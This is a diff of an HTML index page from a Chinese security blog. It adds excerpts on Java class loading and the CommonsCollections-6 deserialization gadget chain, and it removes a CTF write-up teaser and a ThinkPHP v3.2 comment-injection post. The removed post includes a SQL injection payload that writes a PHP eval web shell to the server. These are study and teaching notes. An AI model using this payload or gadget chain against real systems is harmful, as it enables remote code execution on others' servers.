@@ -123,12 +123,12 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">103</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">105</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -181,6 +181,167 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/27/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/27/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">类加载及反序列化利用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-27 05:47:25" itemprop="dateCreated datePublished" datetime="2022-01-27T05:47:25+08:00">2022-01-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-19 20:19:00" itemprop="dateModified" datetime="2022-07-19T20:19:00+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在java反序列化时由于readObject会自动执行代码，在java类加载的时候也会执行代码，从这里可以扩宽攻击的知识面</p>
+<p>Javac原理： javac是用于将源码文件.java编译成对应的字节码文件.class</p>
+<h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><p> 先在方法区找class信息，有的话直接调用，没有的话则使用类加载器加载到方法区（静态成员放在静态区，非静态成功放在非静态区），<strong>静态代码块在类加载时自动执行代码</strong>，<strong>非静态的不执行</strong>；先父类后子类，先静态后非静态；<strong>静态方法和非静态方法都是被动调用</strong>,即<strong>不调用就不执行</strong></p>
+<p><img src="https://image-static.segmentfault.com/200/346/2003461697-5f506a4699821_fix732" alt="image">)</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/01/27/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/CommonsCollections-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/26/CommonsCollections-6/" class="post-title-link" itemprop="url">CommonsCollections-6</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-26 23:05:55 / 修改时间：23:25:33" itemprop="dateCreated datePublished" datetime="2022-01-26T23:05:55+08:00">2022-01-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">java反序列化</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Gadget chain:</span><br><span class="line">        java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line">    by @matthias_kaiser</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>CC6解决了高版本Java的限制，而且利用更加通用。不受版本限制</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/01/26/CommonsCollections-6/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -858,170 +1019,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B%20WEB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/cys.jpg">
-      <meta itemprop="name" content="Y0ng">
-      <meta itemprop="description" content="花有重开日，人无再少年">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y0ng的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/10/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B%20WEB/" class="post-title-link" itemprop="url">长安战疫网络安全卫士守护赛 WEB</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-10 00:59:39" itemprop="dateCreated datePublished" datetime="2022-01-10T00:59:39+08:00">2022-01-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-12 01:56:08" itemprop="dateModified" datetime="2022-01-12T01:56:08+08:00">2022-01-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次被队友带飞，Tql</p>
-<p><img src="https://img-blog.csdnimg.cn/63c1f326d74a4cf0aa5d2d91152e1f35.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/10/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B%20WEB/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/cys.jpg">
-      <meta itemprop="name" content="Y0ng">
-      <meta itemprop="description" content="花有重开日，人无再少年">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y0ng的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/" class="post-title-link" itemprop="url">ThinkPHP v3.2 comment 注释注入写shell</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-09 18:25:52 / 修改时间：18:25:35" itemprop="dateCreated datePublished" datetime="2022-01-09T18:25:52+08:00">2022-01-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ThinkPHP%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">ThinkPHP漏洞集合</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>comment函数是用来进行查询注释功能，当执行sql语句时，搭配comment可能存在利用注释进行 <code>写shell</code>或者 <code>时间盲注</code></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>控制器写入demo</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; M(&#39;Users&#39;)-&gt;comment($id)-&gt;find(intval($id));</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/80b3ae7446c643fca59b073466c53b0c.png#pic_center"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1093,14 +1090,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">103</span>
+          <span class="site-state-item-count">105</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -1132,7 +1129,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
